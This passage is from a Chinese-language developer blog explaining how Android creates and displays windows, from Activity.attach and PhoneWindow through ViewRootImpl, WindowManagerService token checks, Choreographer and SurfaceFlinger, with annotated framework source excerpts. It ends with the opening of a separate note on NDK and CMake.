token, int ident, Application application, Intent intent, ActivityInfo info, CharSequence title, Activity parent, String id, NonConfigurationInstances lastNonConfigurationInstances, Configuration config, String referrer, IVoiceInteractor voiceInteractor, Window window, ActivityConfigCallback activityConfigCallback) { attachBaseContext(context); mWindow = new PhoneWindow(this, window, activityConfigCallback);//创建一个window mWindow.setWindowControllerCallback(this); mWindow.setCallback(this); //用于向activity分发点击或者状态改变事件 mWindow.setOnWindowDismissedCallback(this); mWindow.setWindowManager( (WindowManager)context.getSystemService(Context.WINDOW_SERVICE), mToken, mComponent.flattenToString(), (info.flags &amp; ActivityInfo.FLAG_HARDWARE_ACCELERATED) != 0);//设置windowManager对象 } PhoneWindow中持有了DecorView，DecorView是最顶层的视图 PhoneWindow和mContentParentDecorView继承自FrameLayout，内部只有一个LinearLayout的child（mContentParent）,这个linearLayout从上到下依次是ViewStub(actionBar)，一个FrameLayout(标题栏),一个android.R.id.content的FrameLayout.Activity的setContentView走到了PhoneWindow的setContentView中 // PhoneWindow.java @Override public void setContentView(int layoutResID) { installDecor(); //有所删减 mLayoutInflater.inflate(layoutResID, mContentParent); } private void installDecor() { if (mDecor == null) { mDecor = generateDecor(-1); //new一个DecorView出来 } if (mContentParent == null) { mContentParent = generateLayout(mDecor); //根据不同的theme创建DecorView的child } } protected DecorView generateDecor(int featureId) { return new DecorView(context, featureId, this, getAttributes());//DecorView也就持有了window对象 } protected ViewGroup generateLayout(DecorView decor) { // Inflate the window decor. int layoutResource; //根据不同的theme，可能出现的layoutResource有 layoutResource = R.layout.screen_swipe_dismiss; layoutResource = R.layout.screen_title_icons; layoutResource = R.layout.screen_progress; layoutResource = R.layout.screen_custom_title; layoutResource = a.getResourceId( R.styleable.Window_windowActionBarFullscreenDecorLayout, R.layout.screen_action_bar); layoutResource = R.layout.screen_title; layoutResource = R.layout.screen_simple_overlay_action_mode; layoutResource = R.layout.screen_simple; //这些可能的layoutResource就是DecorView的child的布局文件 mDecor.onResourcesLoaded(mLayoutInflater, layoutResource); //这里面直接layoutInflater这个布局文件，deocorView去add这个View ViewGroup contentParent = (ViewGroup)findViewById(ID_ANDROID_CONTENT);//在这个新创建的布局中找android.R.id.content } //installDecor走完这个mContentParent也就找到了 //上面说道PhoneWindow的setContentView大致两句话，installDecor()和mLayoutInflater.inflate(layoutResID, mContentParent); //于是mLayoutInflater.inflate(layoutResID, mContentParent);就是把开发者写的layoutRes文件对应的view创建出来并且添加到mContentParent中 到这里我们自己写的view也就被添加到android.R.id.content这个FrameLayout里了，这时应该在onCreate里面。根据ActivityThread在6.0的代码 //ActivityThread.java private void handleLaunchActivity(ActivityClientRecord r, Intent customIntent) { Activity a = performLaunchActivity(r, customIntent); if (a != null) { handleResumeActivity(r.token, false, r.isForward,!r.activity.mFinished &amp;&amp; !r.startsNotResumed); } } final void handleResumeActivity(IBinder token, boolean clearHide, boolean isForward, boolean reallyResume) { ActivityClientRecord r = performResumeActivity(token, clearHide);//这里面就是正常的onResume if (r.window == null &amp;&amp; !a.mFinished &amp;&amp; willBeVisible) { r.window = r.activity.getWindow(); View decor = r.window.getDecorView();//拿到decorView decor.setVisibility(View.INVISIBLE);//改为不可见 ViewManager wm = a.getWindowManager(); WindowManager.LayoutParams l = r.window.getAttributes(); a.mDecor = decor; l.type = WindowManager.LayoutParams.TYPE_BASE_APPLICATION; l.softInputMode |= forwardBit; if (a.mVisibleFromClient) { a.mWindowAdded = true; wm.addView(decor, l); //通过windowManager去addView,l是windowManager的layoutparameters，ViewRootImpl也就是从这里创建 } } // The window is now visible if it has been added, we are not // simply finishing, and we are not starting another activity. //上面设置INVISIBLE的原因，这里也说了，如果没有finish，也没有正在起另一个activity的话，就可以让这个activity变得可见了 if (!r.activity.mFinished &amp;&amp; willBeVisible &amp;&amp; r.activity.mDecor != null &amp;&amp; !r.hideForNow) { if (r.activity.mVisibleFromClient) { r.activity.makeVisible(); } } } //activity.java void makeVisible() { if (!mWindowAdded) { ViewManager wm = getWindowManager(); wm.addView(mDecor, getWindow().getAttributes()); mWindowAdded = true; } mDecor.setVisibility(View.VISIBLE);//重新改成visible } 到这里（onResume走完），DecorView就被WindowManager调用addView了。下面开始讲调用WindowManager的addView这个IPC需要准备的参数和远端如何接收这个收到的参数 WindowManagerGlobalWindowManager是一个接口，其addView和removeView是由WindowManagerImpl去调用WindowManagerGlobal做的（设计模式：代理模式。WindowManagerGlobal是app进程中的单例）WindowManagerGlobal和WMS交互调用的是IWindowManager在WMS中的对应实现WindowManagerGlobal.sWindowSession是app进程中所有viewRootImpl的IWindowSession //WindowManagerGlobal.java public void addView(View view, ViewGroup.LayoutParams params, Display display, Window parentWindow) { final WindowManager.LayoutParams wparams = (WindowManager.LayoutParams) params; if (parentWindow != null) { parentWindow.adjustLayoutParamsForSubWindow(wparams);//这里将activity的token设置到了WindowManager.layoutParams中 } ViewRootImpl root; root = new ViewRootImpl(view.getContext(), display); view.setLayoutParams(wparams); // do this last because it fires off messages to start doing things try { root.setView(view, wparams, panelParentView); } catch (RuntimeException e) { // BadTokenException or InvalidDisplayException, clean up. if (index &gt;= 0) { removeViewLocked(index, true); } throw e; } } 到这里，我们从activity.setContentView -&gt; 创建DecorView和DecorView的child，以及找到android.R.id.content，往里面添加自定义布局 -&gt; handleResumeActivity(通过windowManager.addView，然后makeVisible) ，这些都是一个message中处理的。WindowManager.addView转入ViewRootImpl的setView方法,把decorView添加进去了 ViewRootImpl//viewRootImpl.java //首先需要声明ViewRootImpl不是View public final class ViewRootImpl implements ViewParent, View.AttachInfo.Callbacks, ThreadedRenderer.DrawCallbacks { } public void setView(View view, WindowManager.LayoutParams attrs, View panelParentView) { //这里的view是DecorView int res; /* = WindowManagerImpl.ADD_OKAY; */ // Schedule the first layout -before- adding to the window // manager, to make sure we do the relayout before receiving // any other events from the system. requestLayout(); //和windowManagerService打交道的ipc就在这里了 res = mWindowSession.addToDisplay(mWindow, mSeq, mWindowAttributes, getHostVisibility(), mDisplay.getDisplayId(), mWinFrame, mAttachInfo.mContentInsets, mAttachInfo.mStableInsets, mAttachInfo.mOutsets, mAttachInfo.mDisplayCutout, mInputChannel); // mWindowSession是WindowManagerGlobal提供的，全局唯一的static变量 // mWindowSession是IWindowSession对象，IWindowSession.aidl中定义了这个ipc的一系列方法 //这个mWindow其实是ViewRootImpl.W extends IWindow.Stub，也就是WMS远程调用进入app进程中的代理 // Set up the input pipeline.这些stage是责任链模式处理事件，每一个持有前一个的引用 CharSequence counterSuffix = attrs.getTitle(); mSyntheticInputStage = new SyntheticInputStage(); InputStage viewPostImeStage = new ViewPostImeInputStage(mSyntheticInputStage); //这个是处理native层传来的inputEvent的 InputStage nativePostImeStage = new NativePostImeInputStage(viewPostImeStage, &quot;aq:native-post-ime:&quot; + counterSuffix); InputStage earlyPostImeStage = new EarlyPostImeInputStage(nativePostImeStage); InputStage imeStage = new ImeInputStage(earlyPostImeStage, &quot;aq:ime:&quot; + counterSuffix); InputStage viewPreImeStage = new ViewPreImeInputStage(imeStage); InputStage nativePreImeStage = new NativePreImeInputStage(viewPreImeStage, &quot;aq:native-pre-ime:&quot; + counterSuffix); mFirstInputStage = nativePreImeStage; mFirstPostImeInputStage = earlyPostImeStage; mPendingInputEventQueueLengthCounterName = &quot;aq:pending:&quot; + counterSuffix; } 下面开始关注这个ipc IWindowSession.addToDisplay做了什么参考《深入理解Android卷 I》- 第八章 - Surface- 读书笔记-part2 下面这些都运行在system_server进程frameworks/base/services/core/java/com/android/server/wm/Session.java final class Session extends IWindowSession.Stub{ @Override public int addToDisplay(IWindow window, int seq, WindowManager.LayoutParams attrs, int viewVisibility, int displayId, Rect outContentInsets, Rect outStableInsets, Rect outOutsets, InputChannel outInputChannel) { return mService.addWindow(this, window, seq, attrs, viewVisibility, displayId, outContentInsets, outStableInsets, outOutsets, outInputChannel); } } frameworks/base/services/core/java/com/android/server/wm/WindowManagerService.java WMS的成员变量包括 mSessions:ArraySet&lt;Session&gt; //All currently active sessions with clients.一个app只有一个session mWindowMap:HashMap&lt;IBinder,WindowState&gt; // Mapping from an IWindow IBinder to the server&#39;s Window object.Key是IWindow mTokenMap:HashMap&lt;IBinder,WindowToken&gt; //Mapping from a token IBinder to a WindowToken object.key应该是IApplicationToken，是从WindowManager.LayoutParams.token跨ipc传入的，value是windowToken。一个windowToken(背后对应唯一activity)，下面包含多个windowState(一个activity可以有多个窗口，比如Dialog) 一个windowToken中存有多个WindowState(token.windows),而一般的，一个WindowState就对应一个window.就像WMS要管理多个app(WindowToken)，每个app有多个窗口(WindowState，在app端就是ViewRootImpl.W)， //windowManagerService.java public int addWindow(Session session, IWindow client, int seq, WindowManager.LayoutParams attrs, int viewVisibility, int displayId, Rect outContentInsets, Rect outStableInsets, Rect outOutsets, InputChannel outInputChannel) { if (token == null) { //这就是系统要求TYPE_APPLICATION类型的窗口，要求必须有activity的token,否则会抛出BadTokenException异常。Dialog的type是TYPE_APPLICATION,所以必须要在layoutParams中填上activity的token if (type &gt;= FIRST_APPLICATION_WINDOW &amp;&amp; type &lt;= LAST_APPLICATION_WINDOW) { //1-99之间 ,TYPE_APPLICATION=2 Slog.w(TAG, &quot;Attempted to add application window with unknown token &quot; + attrs.token + &quot;. Aborting.&quot;); return WindowManagerGlobal.ADD_BAD_APP_TOKEN; } } // 这里包括一系列的检查 // 1. 窗口类型必须是合法范围内的，应用窗口，子窗口，或者系统窗口 // 2. 如果是系统窗口，需要进行权限检查。TYPE_TOAST,TYPE_WALLPAPER等不需要权限 // 3. 如果是应用窗口，先用attrs里面的token检索出来WindowToken，必须不能为null，而且还得是Activity的mAppToken，同时该Activity还必须没有被finish。在Activity启动的时候，会先通过WMS的addAppToken方法添加一个AppWindowToken(IApplicationToken.Stub appToken)到mTokenMap中（ActivityStack.startActivityLocked），其中key就用到了IApplicationToken。而这个mAppToken就是在activity的attach方法里面赋值的，具体来自AMS.(所以就是system_server进程在启动一个activity的时候往WMS的一个map里放了一个new WindowToken对象。app进程在handleLaunchActivity的时候会拿到这个appToken，于是app进程拿着这个mAppToken通过ipc到WMS中去问，有没有这个mAppToken存过东西) WindowState win = new WindowState(this, session, client, token, attachedWindow, appOp[0], seq, attrs, viewVisibility, displayContent); //后续会将这个WindowState添加到WMS的成员中, token.windows.add(i, win); // ... // tokenMap里面没有找到 token = new WindowToken(this, attrs.token, -1, false); //attrs就是layoutParams.token就通过binder call传入wms进程，所以token就是activity的token，token是绑定在window上，也就是一个activity有一个 // .. if (addToken) { mTokenMap.put(attrs.token, token);//mTokenMap保存所有的WindowToken对象,key是 } win.attach(); //将session添加到mSessions中 mWindowMap.put(client.asBinder(), win);//这个client是IWindow，其实就是ViewRootImpl.W类对象为key,windowState作为value。这不就是一个ViewRootImpl对应一个WindowState嘛 } // WindowState.java void attach() { if (WindowManagerService.localLOGV) Slog.v( TAG, &quot;Attaching &quot; + this + &quot; token=&quot; + mToken + &quot;, list=&quot; + mToken.windows); mSession.windowAddedLocked(); } //Session.java void windowAddedLocked() { if (mSurfaceSession == null) { mSurfaceSession = new SurfaceSession(); mService.mSessions.add(this);// windowState.attach -&gt; Session.windowAddedLocked -&gt; WMS.msession.add(session) } mNumWindow++; } // windowToken.java //windowToken似乎有用的方法就这么一个，也说明一个windowToken实际上有多个Window void removeAllWindows() { for (int winNdx = windows.size() - 1; winNdx &gt;= 0; --winNdx) { WindowState win = windows.get(winNdx); if (WindowManagerService.DEBUG_WINDOW_MOVEMENT) Slog.w(WindowManagerService.TAG, &quot;removeAllWindows: removing win=&quot; + win); win.mService.removeWindowLocked(win); } windows.clear(); } 一般的，每一个window都对应一个WindowState对象，该对象的成员中mClient(final IWindow mClient;)用于跟应用端交互成员变量mToken(WindowToken mToken;)用于跟AMS交互 ViewRootImpl中有针对远程返回的res判断的逻辑,结合这WindowManagerService的addView方法查看更加清楚 //ViewRootImpl.java switch (res) { case WindowManagerGlobal.ADD_BAD_APP_TOKEN: case WindowManagerGlobal.ADD_BAD_SUBWINDOW_TOKEN: throw new WindowManager.BadTokenException( &quot;Unable to add window -- token &quot; + attrs.token + &quot; is not valid; is your activity running?&quot;); case WindowManagerGlobal.ADD_NOT_APP_TOKEN: throw new WindowManager.BadTokenException( &quot;Unable to add window -- token &quot; + attrs.token + &quot; is not for an application&quot;); case WindowManagerGlobal.ADD_APP_EXITING: throw new WindowManager.BadTokenException( &quot;Unable to add window -- app for token &quot; + attrs.token + &quot; is exiting&quot;); } //windowManagerService.java public int addWindow(Session session, IWindow client,xxx) { //从一个HashMap&lt;IBinder,WindowToken&gt;中去get(LayoutParams.attr.token) WindowToken token = displayContent.getWindowToken( hasParent ? parentWindow.mAttrs.token : attrs.token); //如果发现没有windowToken(一个WindowToken有多个windowState,也就是有多个window)，开始报错 if (token == null) { if (rootType &gt;= FIRST_APPLICATION_WINDOW &amp;&amp; rootType &lt;= LAST_APPLICATION_WINDOW) { // 1-99之间，多数是这里 Slog.w(TAG_WM, &quot;Attempted to add application window with unknown token &quot; + attrs.token + &quot;. Aborting.&quot;); return WindowManagerGlobal.ADD_BAD_APP_TOKEN; // 这里回到app进程就抛is your activity running? } }else { // ..省略.... if (atoken == null) { Slog.w(TAG_WM, &quot;Attempted to add window with non-application token &quot; + token + &quot;. Aborting.&quot;); return WindowManagerGlobal.ADD_NOT_APP_TOKEN; } else if (atoken.removed) { Slog.w(TAG_WM, &quot;Attempted to add window with exiting application token &quot; + token + &quot;. Aborting.&quot;); return WindowManagerGlobal.ADD_APP_EXITING; //这里抛出什么错，在ViewRootImpl里面就有对应的解释 } } 添加View到WMS的流程 从WMS中RemoveView的流程 回到ViewRootImpl的setView方法,session.addToDisplay//ViewRootImpl.java res = mWindowSession.addToDisplay(mWindow, mSeq, mWindowAttributes, getHostVisibility(), mDisplay.getDisplayId(), mWinFrame, mAttachInfo.mContentInsets, mAttachInfo.mStableInsets, mAttachInfo.mOutsets, mAttachInfo.mDisplayCutout, mInputChannel); //app端到服务端 //调用服务端通过IWindowSession, // IWindowSession在server端的实现是Session final IWindowSession mWindowSession; final class Session extends IWindowSession.Stub{ //运行在system_server进程，是system_server的binder服务端 } //服务端到app端 //控制app端通过IWindow，app端提供的实现就是W。 final W mWindow; static class W extends IWindow.Stub{ //运行在app进程，是app端的ViewRootImpl.W服务的binder代理对象 //这个W的构造函数把ViewRootImpl用weakReference包起来了，远程有消息到达的时候就去调用viewRootImpl的对应方法 } app端通过IWindowSession调用WMS端的方法，WMS端通过IWindow(WindowState.mClient)调用app端的方法 Window调用过程中涉及到的IPC服务 Binder服务端 接口 所在进程 WindowManagerService IWindowManager system_server Session IWindowSession system_server ViewRootImpl.W IWindow app进程 ActivityRecord.Token IApplicationToken system_server ActivityRecord.Token:StartActivity通过binder call进入systemServer进程，在AMS中创建相应的ActivityRecord.Token的成员变量appToken，然后将该对象传递到ActivityThread. Token这个东西在几处出现了，Activity（performLaunchActivity中的attach赋值，对应AMS中的ActivityRecord）Window(attach方法里的PhoneWindow.setWindowManager去赋值)WindowManager.LayoutParams.token(用于IPC)ViewRootImpl, View, View.AttachInfo（都是在dispatchAttachToWindow的时候去设置到attachInfo的）。所以任意的View只要被添加了，那么就会有attachInfo，也就有了token(attachInfo里的token都是ViewRootImpl给的，也就是ViewRootImpl.W这个class的实例) ViewRootImpl的traversal上面才讲到handleResumeActivity之后创建了一个ViewRootImpl根据6.0的代码 //ActivityThread.java public void handleResumeActivity(IBinder token, boolean finalStateRequest, boolean isForward, String reason) { if (r.window == null &amp;&amp; !a.mFinished &amp;&amp; willBeVisible) { r.window = r.activity.getWindow();//这些东西都是在onCreate里面去创建出来的 View decor = r.window.getDecorView(); decor.setVisibility(View.INVISIBLE); ViewManager wm = a.getWindowManager(); WindowManager.LayoutParams l = r.window.getAttributes(); a.mDecor = decor; l.type = WindowManager.LayoutParams.TYPE_BASE_APPLICATION; l.softInputMode |= forwardBit; if (a.mVisibleFromClient) { a.mWindowAdded = true; wm.addView(decor, l);//这里走进WindowManagerGlobal.addView } // If the window has already been added, but during resume // we started another activity, then don&#39;t yet make the // window visible. } else if (!willBeVisible) { if (localLOGV) Slog.v( TAG, &quot;Launch &quot; + r + &quot; mStartedActivity set&quot;); r.hideForNow = true; } } } 好像还没有scheduleTraversal呢。接着看，在WindowManagerGlobal的addView里面创建了ViewRootImpl，后者在setView的时候: //WindowManagerGlobal.java root = new ViewRootImpl(view.getContext(), display); view.setLayoutParams(wparams);//这里面直接一个requestLayout //ViewRootImpl.java / Schedule the first layout -before- adding to the window public void setView(View view, WindowManager.LayoutParams attrs, View panelParentView) { // Schedule the first layout -before- adding to the window // manager, to make sure we do the relayout before receiving // any other events from the system. requestLayout(); //这里又进行了一次requestLayout //这后面才是去ipc res = mWindowSession.addToDisplay(mWindow, mSeq, mWindowAttributes, getHostVisibility(), mDisplay.getDisplayId(), mWinFrame, mAttachInfo.mContentInsets, mAttachInfo.mStableInsets, mAttachInfo.mOutsets, mAttachInfo.mDisplayCutout, mInputChannel); } //来看看ViewRootImpl的requestLayout，这个方法是ViewParent接口的 @Override public void requestLayout() { if (!mHandlingLayoutInLayoutRequest) { checkThread(); mLayoutRequested = true; scheduleTraversals();//直接scheduleTraversal了 } } scheduleTraversals里面就是 //ViewRootImpl.java void scheduleTraversals() { if (!mTraversalScheduled) { mTraversalScheduled = true; mTraversalBarrier = mHandler.getLooper().getQueue().postSyncBarrier();//PostSyncBarrier，这之后只有异步消息才能通过！ mChoreographer.postCallback( Choreographer.CALLBACK_TRAVERSAL, mTraversalRunnable, null); // mDisplayEventReceiver.scheduleVsync();请求硬件系统VSync信号 } } 接下来就是mDisplayEventReceiver.onVsync的时候去doFrame //Choreographer.java try { Trace.traceBegin(Trace.TRACE_TAG_VIEW, &quot;Choreographer#doFrame&quot;); AnimationUtils.lockAnimationClock(frameTimeNanos / TimeUtils.NANOS_PER_MS); mFrameInfo.markInputHandlingStart(); doCallbacks(Choreographer.CALLBACK_INPUT, frameTimeNanos); //最先处理INPUT mFrameInfo.markAnimationsStart(); doCallbacks(Choreographer.CALLBACK_ANIMATION, frameTimeNanos);//随后是animation mFrameInfo.markPerformTraversalsStart(); doCallbacks(Choreographer.CALLBACK_TRAVERSAL, frameTimeNanos);//第三个是ViewRootImpl.doTraversal，在这里ViewRootImpl会解除postSyncBarrier doCallbacks(Choreographer.CALLBACK_COMMIT, frameTimeNanos); } finally { AnimationUtils.unlockAnimationClock(); Trace.traceEnd(Trace.TRACE_TAG_VIEW); } 这样看来，在第一次handleResumeActivity的时候，Choreographer会主动设定一次traversal，后续的measure,layout,draw也就顺理成章了 Dialog子窗口的话,典型的例子是dialog。直接使用Activity的windowManager和WMS交互Dialog的构造函数中 //Dialog.java Dialog(@NonNull Context context, @StyleRes int themeResId, boolean createContextThemeWrapper) { mWindowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE); // 此时拿到的是Activity的windowManager final Window w = new PhoneWindow(mContext); mWindow = w; w.setCallback(this); w.setWindowManager(mWindowManager, null, null);//这一段是为这个new出来的PhoneWindow设置一个windownManager。 //也就是说Dialog的显示其实是使用了Activity的windowManager去调用WMS的服务的，而Dialog自身的window由于没有token，所以这个window并不能用于和WMS交互。更多的是用于持有DecorView(新的window的DecorView),等到iput事件来到时，会通过ViewRootImpl传递到DecorView(新的window的DecorView)，DecorView再交给WindowCallback. } //Activity.java void attach(){ mWindow.setWindowManager( (WindowManager)context.getSystemService(Context.WINDOW_SERVICE), mToken, mComponent.flattenToString(), (info.flags &amp; ActivityInfo.FLAG_HARDWARE_ACCELERATED) != 0); } //Activity.java @Override public Object getSystemService(@ServiceName @NonNull String name) { if (WINDOW_SERVICE.equals(name)) { return mWindowManager; //..Activity直接在这里让Dialog获取到自己的windowManager（其对应的window已经填充好mAppToken了） } return super.getSystemService(name); } 如果没有token的话，ViewRootImpl.setView方法会在远程失败。在Dialog.show中调用了mWindowManager.addView(mDecor, l);这个mWindowManager其实已经是Activity的mWindowManager了。所以对这个mWindowManager(内部用mParentWindow，即Activity的window)调用addView方法。在WindowManagerGlobal的addView中有adjustLayoutParamsForSubWindow这个方法，这里最重要的就是给WindowManager.LayoutParams.token赋值。mWindowManager.addView(mDecor, l); -&gt; WindowManagerGlobal.addView -&gt; Window.adjustLayoutParamsForSubWindow(就是在这里从Activity的window中取出token赋值给layoutParams的) WindowManager.LayoutParams中有三种窗口类型type 应用程序窗口：FIRST_APPLICATION_WINDOW - LAST_APPLICATION_WINDOW (1-99)。 Activity的window,Dialog的window 子窗口: FIRST_SUB_WINDOW - LAST_SUB_WINDOW (1000-1999). 例如PopupWindow，ContextMenu，optionMenu。子窗口必须要有一个父窗口，父窗口可以是应用程序窗口，也可以是其他任意类型。父窗口的不可见时，子窗口不可见 系统窗口: FIRST_SYSTEM_WINDOW - LAST_SYSTEM_WINDOW (2000 -2999) Toast，输入法等等。系统窗口不需要对应Activity，比如TYPE_SYSTEM_ALERT，状态栏，来电显示，屏保等 // Window.java 当前实例是Activity的PhoneWindow，其成员变量mAppToken在activity的attach中就初始化了，debug发现是BinderProxy实例 void adjustLayoutParamsForSubWindow(WindowManager.LayoutParams wp) { if (wp.type &gt;= WindowManager.LayoutParams.FIRST_SUB_WINDOW &amp;&amp; wp.type &lt;= WindowManager.LayoutParams.LAST_SUB_WINDOW) { //1000-1999 // if (wp.token == null) { View decor = peekDecorView(); if (decor != null) { wp.token = decor.getWindowToken();//从mAttachInfo.mWindowToken获取 } } } else if (wp.type &gt;= WindowManager.LayoutParams.FIRST_SYSTEM_WINDOW &amp;&amp; wp.type &lt;= WindowManager.LayoutParams.LAST_SYSTEM_WINDOW) { //系统window 2000-2999 } else { //dialog的type因为是2，所以走到这里 if (wp.token == null) { wp.token = mContainer == null ? mAppToken : mContainer.mAppToken;//Dialog会走到这里，mAppToken不为null } } } PopupWindow//popupwindow的LayoutParams.type默认是 private int mWindowLayoutType = WindowManager.LayoutParams.TYPE_APPLICATION_PANEL;// 1000 //可以修改的 //PopupWindow.java public void showAsDropDown(View anchor, int xoff, int yoff, int gravity) { final WindowManager.LayoutParams p = createPopupLayoutParams(anchor.getApplicationWindowToken()); } public void showAtLocation(View parent, int gravity, int x, int y) { mParentRootView = new WeakReference&lt;&gt;(parent.getRootView()); showAtLocation(parent.getWindowToken(), gravity, x, y); } 可以发现无论是showAsDropDown还是showAtLocation全都是需要从anchorView拿到windowToken的 private void invokePopup(WindowManager.LayoutParams p) { mWindowManager.addView(decorView, p); //这时候的p已经填充了token } Toast用IPC往NotificationManagerService的一个队列中添加一个runnable，系统全局所有应用的Toast请求都被添加到这里，排队，一个个来，远程再回调app进程的Toast.TN(extends ITransientNotification.Stub)的handleShow方法去添加一个type为WindowManager.LayoutPrams.TYPE_TOAST的view。当然，时间到了远程还会回调cancelToast去用WMS移除View。 doTraversalViewRootImpl中的doTraversal可以分成三件事 mView.performMeasuremView.performLayoutmView.performDraw 这里的mView也就是DecorView了 measure//onMeasure里的两个参数witdthMeasureSpec和heightMeasureSpec是怎么来的 @Override protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) { } //ViewGroup.java中有这么一段 protected void measureChildWithMargins(View child, int parentWidthMeasureSpec, int widthUsed, int parentHeightMeasureSpec, int heightUsed) { final MarginLayoutParams lp = (MarginLayoutParams) child.getLayoutParams(); final int childWidthMeasureSpec = getChildMeasureSpec(parentWidthMeasureSpec, mPaddingLeft + mPaddingRight + lp.leftMargin + lp.rightMargin + widthUsed, lp.width); final int childHeightMeasureSpec = getChildMeasureSpec(parentHeightMeasureSpec, mPaddingTop + mPaddingBottom + lp.topMargin + lp.bottomMargin + heightUsed, lp.height); child.measure(childWidthMeasureSpec, childHeightMeasureSpec); } //ViewGroup.java public static int getChildMeasureSpec(int spec, int padding, int childDimension) { //这个childDimension就是lp.width或者lp.height int specMode = MeasureSpec.getMode(spec); int specSize = MeasureSpec.getSize(spec); int size = Math.max(0, specSize - padding); //所以这个size就是当前这个viewGroup的measureSpec中的size-viewgroup的padding-child.lp.margin之后的值 int resultSize = 0; int resultMode = 0; switch (specMode) { // Parent has imposed an exact size on us case MeasureSpec.EXACTLY: if (childDimension &gt;= 0) { //如果自己是EXACTLY，child的lp.width或者lp.height&gt;0的话，生成一个size为dimension只，mode为EXACTLY的 spec resultSize = childDimension; resultMode = MeasureSpec.EXACTLY; } else if (childDimension == LayoutParams.MATCH_PARENT) { // Child wants to be our size. So be it. resultSize = size; resultMode = MeasureSpec.EXACTLY; } else if (childDimension == LayoutParams.WRAP_CONTENT) { // Child wants to determine its own size. It can&#39;t be // bigger than us. resultSize = size; resultMode = MeasureSpec.AT_MOST; } break; // Parent has imposed a maximum size on us case MeasureSpec.AT_MOST: if (childDimension &gt;= 0) { // Child wants a specific size... so be it resultSize = childDimension; resultMode = MeasureSpec.EXACTLY; } else if (childDimension == LayoutParams.MATCH_PARENT) { // Child wants to be our size, but our size is not fixed. // Constrain child to not be bigger than us. resultSize = size; resultMode = MeasureSpec.AT_MOST; } else if (childDimension == LayoutParams.WRAP_CONTENT) { // Child wants to determine its own size. It can&#39;t be // bigger than us. resultSize = size; resultMode = MeasureSpec.AT_MOST; } break; return MeasureSpec.makeMeasureSpec(resultSize, resultMode); } layout这里就是调用onLayout方法了，FrameLayout会根据child的Gravity横向或者纵向摆放。LinearLayout会根据自己的orientation，从上到下或者从左到右进行摆放。 drawpublic void draw(Canvas canvas) { . . . // 绘制背景，只有dirtyOpaque为false时才进行绘制，下同 int saveCount; if (!dirtyOpaque) { drawBackground(canvas); } . . . // 绘制自身内容 if (!dirtyOpaque) onDraw(canvas); // 绘制子View dispatchDraw(canvas); . . . // 绘制滚动条等 onDrawForeground(canvas); } draw的基本流程是这样，这个canvas是ViewRootImpl中的canvas = mSurface.lockCanvas(dirty);获得的。个人理解Canvas是存储了一系列的指令，再交给surface ChoregrapherChoregrapher里面有一个内部类FrameDisplayEventReceiver(继承自DisplayEventReceiver，DisplayEventReceiver是一个没有抽象方法的抽象类)，主要提供两个方法nativeScheduleVsync和onVsync。FrameDisplayEventReceiver在onVsync的时候会post一个异步(也就是说不受syncBarrier阻拦)的消息到主线程上去调用Choregrapher的doFrame（这里面就是把之前所有通过Choregrapher.postCallback添加到队列的事件拿出来，到期了就执行） 主线程的MessageQueue被syncBarrier堵住的显著特征是meg.target==null(也就是对应的handler为null). ViewRootImpl在scheduleTraversals的时候会postSyncBarrier一次，也就是说，这个doTraversal是高优先级的，这一刻起后面的所有丢到主线程上的msg都要等到我doTraversal完成后才执行(异步消息例外，所以上面onVsync的消息得是异步的)。从时间顺序上来讲，ViewRootImpl.scheduleTraversal -&gt; mChoreographer.postCallback -&gt; Choreographer开始scheduleFrameLocked（假如时间到了，直接调用nativeScheduleVsync，否则发送的msg全都是异步的，就是为了跨过之前的barrier.）同样，在onVsync的时候，由于此时的barrier还没移除，所以发出的消息还得是异步的。doFrame里面，严格按照input -&gt; animation -&gt; traversal的类型去执行。也就是viewRootImpl在scheduleTraversals的时候post的callback要老老实实在第三组被执行。而在轮到这个doTraversal执行的时候，终于可以去移除barrier了。 需要指明的是，每一次scheduleTraversal都要触发measure -&gt; layout -&gt; draw这一套，所以，耗时是很严重的。vsync信号也不是系统主动发出的，而是需要通过nativeScheduleVsync请求，才会有一次onVsync的相应的。看了一下，ViewRootImpl里面的setLayoutParams，invalidate,requestLayout,requestFitSystemWindows等方法里面都会触发scheduleTraversal。 显然在onCreate的setContentView里面会至少调用一次。然后就是熟悉的performTraversal(measure,layout,draw)。 人们常说在onCreate里面获取一个View的宽高有四种方式：onPreDraw,onLayoutChange,view.measure.第四种就是直接在setContentView后面跟着post一个msg，原理就是前面有一个barrier，这个barrier解除之后执行的第一个msg大概率就是这个msg(不考虑别的线程这么巧也插进来)，这时候，performTraversals刚刚走完，draw也走完了,最后绘制数据都缓存到Surface上。但是systemServer那边，windowManagerService和surfaceFlinger那边还没来得及处理这些刚draw的数据（surfaceFlinger那边还要compose，没那么快吧）。 surfaceFlingerAndroid是通过系统级进程中的SurfaceFlinger服务来把真正需要显示的数据渲染到屏幕上。SurfaceFlinger的主要工作是：响应客户端事件，创建Layer与客户端的Surface建立连接。接收客户端数据及属性，修改Layer属性，如尺寸、颜色、透明度等。将创建的Layer内容刷新到屏幕上。维持Layer的序列，并对Layer最终输出做出裁剪计算。因应用层和系统层分别是两个不同进程，需要一个跨进程的通信机制来实现数据传输，在Android的显示系统中，使用了Android的匿名共享内存：SharedClient。每一个应用和SurfaceFlinger之间都会创建一个SharedClient，每个SharedClient中，最多可以创建31个SharedBufferStack，每个Surface都对应一个SharedBufferStack，也就是一个window。这意味着一个Android应用程序最多可以包含31个窗口，同时每个SharedBufferStack中又包含两个(=4.1)缓冲区。应用层绘制到缓冲区，SurfaceFlinger把缓存区数据渲染到屏幕，两个进程之间使用Android的匿名共享内存SharedClient缓存需要显示的数据。 WMS跟surfaceFlinger交互的过程是，WMS建立SurfaceComposerClient，然后会在SF中创建Client与之对应，后续通过ISurfaceComposerClient与SF通信 APP可以没有Activty,PhoneWindow,DecorView，例如带悬浮窗的service。 参考图片出自Bugly深入理解Android之View的绘制流程","tags":[]},{"title":"ndk入门笔记","date":"2019-02-13T18:25:01.000Z","path":"2019/02/13/2019-02-13-ndk-related-topics/","text":"android中ndk及jni编写注意事项（本文主要讲CMake）一些小窍门 cmake最终执行的命令在这个文件里面.externalNativeBuild/cmake/debug/{abi}/cmake_build_command.txtcmake生成的.so文件在”\\app\\build\\intermediates\\cmake\\debug\\obj\\arm64-v8a”这个路径下。CMake 一共有2种编译工具链 - clang 和 gcc，gcc 已经废弃，clang 是默认的。 ndk官方入门指南 cpu架构 armeabi armeabi­v7a arm64­v8a x86 x86_64 mips mips64 